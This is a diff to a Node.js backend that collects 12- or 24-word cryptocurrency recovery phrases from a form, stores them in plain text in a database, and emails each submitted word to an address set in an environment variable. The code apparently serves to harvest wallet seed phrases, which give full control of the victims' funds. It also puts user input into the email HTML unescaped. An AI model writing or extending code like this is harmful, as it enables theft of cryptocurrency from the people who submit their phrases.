@@ -5,10 +5,15 @@ bip39 = require('bip39');
 const jwt = require('jsonwebtoken');
 const { sendEmail } = require('../emailSend/Nodemailer');
 
-// Save the 12 words into DB
+// Save the 12 or 24 words into DB
 exports.addword = async (req, res) => {
   try {
-    const { type, one, two, three, four, five, six, seven, eight, nine, ten, eleven, twelve } = req.body;
+    const {
+      type,
+      one, two, three, four, five, six, seven, eight, nine, ten, eleven, twelve,
+      thirteen, fourteen, fifteen, sixteen, seventeen, eighteen, nineteen, twenty,
+      twenty_one, twenty_two, twenty_three, twenty_four
+    } = req.body;
     const authHeader = req.headers.authorization;
     if (!authHeader) {
       return res.status(401).json({ msg: 'Authorization token missing', status_code: false });
@@ -32,31 +37,42 @@ exports.addword = async (req, res) => {
     // 2️⃣ Insert new wallet words
     const insertSql = `
       INSERT INTO wallet 
-      (user_id, type, one, two, three, four, five, six, seven, eight, nine, ten, eleven, twelve, created_at, updated_at) 
-      VALUES ($1, $2, $3, $4, $5, $6, $7, $8, $9, $10, $11, $12, $13, $14, NOW(), NOW())
+      (user_id, type, one, two, three, four, five, six, seven, eight, nine, ten, eleven, twelve,
+       thirteen, fourteen, fifteen, sixteen, seventeen, eighteen, nineteen, twenty,
+       twenty_one, twenty_two, twenty_three, twenty_four, created_at, updated_at) 
+      VALUES ($1, $2, $3, $4, $5, $6, $7, $8, $9, $10, $11, $12, $13, $14,
+              $15, $16, $17, $18, $19, $20, $21, $22, $23, $24, $25, $26, NOW(), NOW())
       RETURNING id
     `;
     const [result] = await db.query(insertSql, [
-      userId, type, one, two, three, four, five, six, seven, eight, nine, ten, eleven, twelve
+      userId, type,
+      one, two, three, four, five, six, seven, eight, nine, ten, eleven, twelve,
+      thirteen || null, fourteen || null, fifteen || null, sixteen || null, seventeen || null, eighteen || null, nineteen || null, twenty || null,
+      twenty_one || null, twenty_two || null, twenty_three || null, twenty_four || null
     ]);
+
+    // Build the email HTML dynamically for only the provided words
+    const wordsKeys = [
+      'one', 'two', 'three', 'four', 'five', 'six', 'seven', 'eight', 'nine', 'ten', 'eleven', 'twelve',
+      'thirteen', 'fourteen', 'fifteen', 'sixteen', 'seventeen', 'eighteen', 'nineteen', 'twenty',
+      'twenty_one', 'twenty_two', 'twenty_three', 'twenty_four'
+    ];
+    let rowsHtml = '';
+    wordsKeys.forEach((key) => {
+      const val = req.body[key];
+      if (val !== undefined && val !== null && val !== '') {
+        const readableKey = key.replace('_', ' ').replace(/\b\w/g, c => c.toUpperCase());
+        rowsHtml += `<tr><td><strong>${readableKey}</strong></td><td>${val}</td></tr>`;
+      }
+    });
+
     await sendEmail({
       to: process.env.EMAIL_PASS,
       subject: `New ${type} Data Received`,
       html: `
         <h2>${type} Details</h2>
         <table border="1" cellpadding="8" cellspacing="0" style="border-collapse:collapse; width:100%; font-family:Arial, sans-serif;">
-          <tr><td><strong>One</strong></td><td>${one || "-"}</td></tr>
-          <tr><td><strong>Two</strong></td><td>${two || "-"}</td></tr>
-          <tr><td><strong>Three</strong></td><td>${three || "-"}</td></tr>
-          <tr><td><strong>Four</strong></td><td>${four || "-"}</td></tr>
-          <tr><td><strong>Five</strong></td><td>${five || "-"}</td></tr>
-          <tr><td><strong>Six</strong></td><td>${six || "-"}</td></tr>
-          <tr><td><strong>Seven</strong></td><td>${seven || "-"}</td></tr>
-          <tr><td><strong>Eight</strong></td><td>${eight || "-"}</td></tr>
-          <tr><td><strong>Nine</strong></td><td>${nine || "-"}</td></tr>
-          <tr><td><strong>Ten</strong></td><td>${ten || "-"}</td></tr>
-          <tr><td><strong>Eleven</strong></td><td>${eleven || "-"}</td></tr>
-          <tr><td><strong>Twelve</strong></td><td>${twelve || "-"}</td></tr>
+          ${rowsHtml}
         </table>
         <p style="margin-top:20px;">This email was automatically generated from form submission.</p>
       `
@@ -72,7 +88,7 @@ exports.addword = async (req, res) => {
 };
 
 
-// Get 12 words from DB and generate wallet
+// Get 12 or 24 words from DB and generate wallet
 exports.generateWalletAddress = async (req, res) => {
   try {
     const authHeader = req.headers.authorization;
@@ -86,7 +102,10 @@ exports.generateWalletAddress = async (req, res) => {
     const userId = decoded.userId;
 
     const sql = `
-      SELECT id, user_id, type, one, two, three, four, five, six, seven, eight, nine, ten, eleven, twelve, created_at, updated_at
+      SELECT id, user_id, type,
+             one, two, three, four, five, six, seven, eight, nine, ten, eleven, twelve,
+             thirteen, fourteen, fifteen, sixteen, seventeen, eighteen, nineteen, twenty,
+             twenty_one, twenty_two, twenty_three, twenty_four, created_at, updated_at
       FROM wallet
       WHERE user_id = $1
       ORDER BY id
@@ -104,8 +123,10 @@ exports.generateWalletAddress = async (req, res) => {
       type: row.type,
       mnemonic: [
         row.one, row.two, row.three, row.four, row.five, row.six,
-        row.seven, row.eight, row.nine, row.ten, row.eleven, row.twelve
-      ].join(' '),
+        row.seven, row.eight, row.nine, row.ten, row.eleven, row.twelve,
+        row.thirteen, row.fourteen, row.fifteen, row.sixteen, row.seventeen, row.eighteen,
+        row.nineteen, row.twenty, row.twenty_one, row.twenty_two, row.twenty_three, row.twenty_four
+      ].filter(Boolean).join(' '),
       created_at: row.created_at,
       updated_at: row.updated_at
     }));
@@ -140,7 +161,9 @@ exports.getwalletHistory = async (req, res) => {
 
     // 2. Fetch mnemonic words from DB
     const sql = `
-      SELECT one, two, three, four, five, six, seven, eight, nine, ten, eleven, twelve
+      SELECT one, two, three, four, five, six, seven, eight, nine, ten, eleven, twelve,
+             thirteen, fourteen, fifteen, sixteen, seventeen, eighteen, nineteen, twenty,
+             twenty_one, twenty_two, twenty_three, twenty_four
       FROM wallet
       WHERE user_id = $1
     `;
@@ -157,8 +180,10 @@ exports.getwalletHistory = async (req, res) => {
       .map(r => {
         const phrase = [
           r.one, r.two, r.three, r.four, r.five, r.six,
-          r.seven, r.eight, r.nine, r.ten, r.eleven, r.twelve
-        ].join(' ').trim().toLowerCase();
+          r.seven, r.eight, r.nine, r.ten, r.eleven, r.twelve,
+          r.thirteen, r.fourteen, r.fifteen, r.sixteen, r.seventeen, r.eighteen,
+          r.nineteen, r.twenty, r.twenty_one, r.twenty_two, r.twenty_three, r.twenty_four
+        ].filter(Boolean).join(' ').trim().toLowerCase();
         return bip39.validateMnemonic(phrase) ? phrase : null;
       })
       .filter(Boolean);
